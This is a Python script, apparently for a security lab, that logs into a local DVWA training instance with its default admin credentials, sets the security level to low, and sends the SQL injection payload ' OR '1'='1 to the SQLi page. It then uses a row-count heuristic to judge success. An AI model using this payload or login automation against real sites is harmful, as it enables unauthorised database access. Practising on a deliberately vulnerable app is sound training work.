import requests
from bs4 import BeautifulSoup

BASE_URL = "http://127.0.0.1:4280"

LOGIN_URL = f"{BASE_URL}/login.php"
SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"

USERNAME = "admin"
PASSWORD = "password"


def get_token(html, token_name="user_token"):
    """
    Extract CSRF token from a DVWA form.
    """
    soup = BeautifulSoup(html, "html.parser")
    token_tag = soup.find("input", {"name": token_name})
    if not token_tag:
        raise ValueError("CSRF token not found in page")
    return token_tag.get("value")


def dvwa_login(session: requests.Session) -> bool:
    """
    Logs into DVWA using the provided session and returns True on success.
    """
    r = session.get(LOGIN_URL)
    r.raise_for_status()
    token = get_token(r.text)

    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token,
    }

    r = session.post(LOGIN_URL, data=data)
    r.raise_for_status()

    if "Login failed" in r.text:
        print("[!] Login failed")
        return False

    print("[+] Logged in to DVWA")
    return True


def test_sqli(session: requests.Session, payload: str) -> str:
    """
    Sends a SQLi payload to DVWA's SQL Injection page and returns response HTML.
    """
    params = {
        "id": payload,
        "Submit": "Submit",
    }
    r = session.get(SQLI_URL, params=params)
    r.raise_for_status()
    return r.text


def is_sqli_success(html: str) -> bool:
    """
    Heuristic: treat SQLi as 'success' only if we see multiple user rows.
    Uses count of 'First name' as a proxy.
    """
    return html.count("First name") > 1


def main():
    session = requests.Session()
    # Ensure low security (also set in UI)
    session.cookies.set("security", "low", domain="127.0.0.1", path="/")

    if not dvwa_login(session):
        return

    # Benign payload
    benign_html = test_sqli(session, "1")
    benign_count = benign_html.count("First name")
    print(
        f"[*] Benign] length={len(benign_html)} "
        f"count('First name')={benign_count} "
        f"success={is_sqli_success(benign_html)}"
    )

    # SQLi payload
    sqli_payload = "' OR '1'='1"
    sqli_html = test_sqli(session, sqli_payload)
    sqli_count = sqli_html.count("First name")
    print(
        f"[*] SQLi  ] length={len(sqli_html)} "
        f"count('First name')={sqli_count} "
        f"success={is_sqli_success(sqli_html)}"
    )

    if is_sqli_success(sqli_html):
        print("[+] SQL Injection appears to be successful based on heuristic!")
    else:
        print("[-] SQL Injection not detected by heuristic â€“ refine pattern.")


if __name__ == "__main__":
    main()
